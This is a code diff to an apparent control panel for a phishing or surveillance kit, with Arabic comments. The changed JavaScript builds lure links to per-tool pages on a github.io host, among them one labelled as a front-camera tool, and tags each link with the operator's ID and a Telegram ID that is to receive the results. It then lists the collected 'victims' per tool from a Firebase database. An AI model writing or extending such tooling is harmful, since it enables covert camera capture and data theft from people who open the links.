@@ -500,8 +500,10 @@ button[onclick*="save"]:hover {
         <small style="color: #888; font-size: 10px; display: block; margin-bottom: 10px;">
             👤 سيتم إرسال النتائج لهذا الـ ID على التليجرام
         </small>
-        
-        <button class="btn btn-neon" onclick="generateCustomLink()">GENERATE 🚀</button>
+   
+<button class="btn btn-neon" onclick="generateCustomLink()">
+    GENERATE 🚀
+</button>
         
         <div id="generated-result" style="display:none; margin-top:15px; padding:10px; border:1px dashed var(--primary); font-size:10px; word-break: break-all;">
             <span id="final-link"></span><br><br>
@@ -706,6 +708,15 @@ button[onclick*="save"]:hover {
     const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
+    
+    // ✅ في أول السكريبت بعد Firebase
+window.generateCustomLink = window.generateCustomLink || function() {
+    alert("Generate function is working!");
+};
+
+window.openToolPage = window.openToolPage || function(tool) {
+    alert("Opening tool: " + tool);
+};
 
     const tools = [
         { name: "كاميرا امامي", value: "fcam", icon: "fas fa-camera" },
@@ -942,27 +953,71 @@ button[onclick*="save"]:hover {
             return showAlert("ACCESS DENIED 🚫", "هذا القسم مغلق لحسابك.");
         }
 
-async function openToolPage(toolValue) {
+// ✅ دالة توليد اللينك المعدلة
+window.generateCustomLink = function() {
+    console.log("Generate button clicked!"); // للتأكد
+    
+    const tool = document.getElementById('tool-select').value;
+    const telegramId = document.getElementById('telegram-id').value || "";
     const user = localStorage.getItem('logged_user');
+    
+    if (!user) {
+        showAlert("ERROR", "يجب تسجيل الدخول أولاً");
+        return;
+    }
+    
+    if (!tool) {
+        showAlert("ERROR", "اختر أداة أولاً");
+        return;
+    }
+    
+    const baseUrl = "https://supportcmd.github.io"; // استخدم الرابط الثابت
+    
+    // ✅ استخدام اسم الأداة كاسم الملف
+    let link = `${baseUrl}/${tool}.html?user_id=${user}&tool=${tool}`;
+    
+    if (telegramId.trim() !== "") {
+        link += `&telegram=${telegramId.trim()}`;
+    }
+    
+    document.getElementById('final-link').innerText = link;
+    document.getElementById('generated-result').style.display = 'block';
+    
+    showAlert("SUCCESS", "تم إنشاء الرابط بنجاح ✅");
+}
+
+// ✅ دالة فتح الأداة المعدلة
+window.openToolPage = async function(toolValue) {
+    console.log("Opening tool:", toolValue);
+    
+    const user = localStorage.getItem('logged_user');
+    if (!user) {
+        showAlert("ERROR", "يجب تسجيل الدخول أولاً");
+        return;
+    }
+    
+    // ✅ التأكد من الصلاحيات
     const permSnap = await db.ref('permissions/' + user + '/' + toolValue).once('value');
     
     if(permSnap.val() === false) {
         return showAlert("ACCESS DENIED 🚫", "هذا القسم مغلق لحسابك.");
     }
-
-    const baseUrl = window.location.href.split('/').slice(0, -1).join('/');
     
-    // ✅ هنا برضه استخدم اسم الأداة
+    // ✅ فتح الرابط في صفحة جديدة
+    const baseUrl = "https://supportcmd.github.io";
     const link = `${baseUrl}/${toolValue}.html?user_id=${user}&tool=${toolValue}`;
     
-    document.getElementById('tool-link-display').innerText = link;
-    document.getElementById('copy-tool-btn').onclick = () => {
-        navigator.clipboard.writeText(link);
-        showAlert("COPIED", "Link copied ✅");
-    };
+    // ✅ نسخ الرابط
+    navigator.clipboard.writeText(link);
     
+    // ✅ فتح في تبويب جديد
+    window.open(link, '_blank');
+    
+    showAlert("LINK COPIED ✅", "تم نسخ الرابط وفتح الأداة");
+    
+    // ✅ عرض الفيكتمز
     const toolObj = tools.find(t => t.value === toolValue);
-    nav('tool', toolObj.name, '⚙️', null);
+    nav('tool', toolObj?.name || toolValue, '⚙️', null);
     loadVictims(toolValue, user);
 }
 
